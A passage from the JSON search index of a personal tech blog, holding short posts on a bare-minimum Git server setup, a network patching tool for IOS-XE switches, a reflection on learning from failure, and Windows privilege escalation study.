minimize.\n","permalink":"https://timo-juhani.github.io/logs/bare-minimum-git/","summary":"\u003cp\u003eI had a recurring annoyance of running Gitlab instances in the lab. No matter whether I used Docker or just normal Gitlab instance at some point it broke or didn\u0026rsquo;t want to upgrade without grief. Frankly, I don\u0026rsquo;t have time to fix broken tools. Instead I need a hammer that is maintenance free. I got back to basics by implementing a bare minimum Git setup like this.\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# Server\n# Create a root folder for all projects\nmkdir ~/projects\ncd projects\nmkdir sampleproject.git\ncd sampleproject.git\ngit init --bare --shared=group\n\n# Client\ngit clone ssh://\u0026lt;user\u0026gt;@\u0026lt;ip\u0026gt;/home/\u0026lt;user\u0026gt;/sampleproject.git\ncd sampleproject\ntouch README.md\ngit add README.md\ngit commit -m \u0026#34;add file\u0026#34;\ngit push origin main\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eThat\u0026rsquo;s it. Another client can clone the repo normally and pull / push changes whenever needed.\u003c/p\u003e","title":"Bare Minimum Git"},{"content":"Patching your infrastructure is one of the best ways to have a huge impact on your security posture. While this is undebateble fact and while some organizations have this under control many still struggle to keep up with the emerging vulnerabilities.\nAs a response to an alarming state of how many networks still run unpatched and the growing number of network exploits I created this project called LAN Upgrade. As of today it\u0026rsquo;s capable of patching IOS-XE switches (and possibly routers -\u0026gt; needs to be tested) in mass and in parallel saving a lot of time and money while reaching the objective of running safe and up to date network.\nThe project is based on Python, expects only SSH connection from network devices and is easy to learn by anyone who has some experience on Linux shell and networking equipment.\nhttps://github.com/timo-juhani/lan_upgrade\n","permalink":"https://timo-juhani.github.io/logs/upgrade-your-networks/","summary":"\u003cp\u003ePatching your infrastructure is one of the best ways to have a huge impact on your security posture. While this is undebateble fact and while some organizations have this under control many still struggle to keep up with the emerging vulnerabilities.\u003c/p\u003e\n\u003cp\u003eAs a response to an alarming state of how many networks still run unpatched and the growing number of network exploits I created this\nproject called LAN Upgrade. As of today it\u0026rsquo;s capable of patching IOS-XE switches (and possibly routers -\u0026gt; needs to be tested) in mass and\nin parallel saving a lot of time and money while reaching the objective of running safe and up to date network.\u003c/p\u003e","title":"Upgrade Your Networks"},{"content":"It\u0026rsquo;s better to fail early than avoid the bitter taste of defeat until the very last moment. It\u0026rsquo;s common to lead a self-talk that is based on untested capabilities and knowledge. When combined imagination and lack of context create a mind trap in which you may believe to be unbeatable but in fact are in the most vulnerable position when the moment of truth comes. It\u0026rsquo;s a very dangerous mind trap. Training and education should be intense, close to real life and present challenging scenario based situations - that sometimes has been designed to offer nothing but defeat. Failure teaches. Success inflates the ego, but as soon as it burst you find only emptiness. Go for the failure so that performance comes easier when its needed. Know your limits and then expand them.\n","permalink":"https://timo-juhani.github.io/logs/failing/","summary":"\u003cp\u003eIt\u0026rsquo;s better to fail early than avoid the bitter taste of defeat until the\nvery last moment. It\u0026rsquo;s common to lead a self-talk that is based on untested\ncapabilities and knowledge. When combined imagination and lack of context create\na mind trap in which you may believe to be unbeatable but in fact are in the\nmost vulnerable position when the moment of truth comes. It\u0026rsquo;s a very dangerous\nmind trap. Training and education should be intense, close to real life and\npresent challenging scenario based situations - that sometimes has been designed\nto offer nothing but defeat. Failure teaches. Success inflates the ego,\nbut as soon as it burst you find only emptiness. Go for the failure so that\nperformance comes easier when its needed. Know your limits and then expand them.\u003c/p\u003e","title":"Failing"},{"content":"As part of the recent studies I\u0026rsquo;ve been trying to wrap my head around Windows privilege escalation techniques. Although the techniques are becoming more and more familiar by just doing repetitions theory plays a role as well. Therefore, the presentation from Wild West Hackin\u0026rsquo; Fest (2019) helped to fill that gap.\nPresentation by Jake Williams\n","permalink":"https://timo-juhani.github.io/logs/windows-privesc-studies/","summary":"\u003cp\u003eAs part of the recent studies I\u0026rsquo;ve been trying to wrap my head around Windows\nprivilege escalation techniques. Although the techniques are becoming more and\nmore familiar by just doing repetitions theory plays a role as well. Therefore,\nthe presentation from Wild West Hackin\u0026rsquo; Fest (2019) helped to fill that gap.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.youtube.com/watch?v=SHdM197sbIE\"\u003ePresentation by Jake Williams\u003c/a\u003e\u003c/p\u003e","title":"Windows Privesc Studies"}]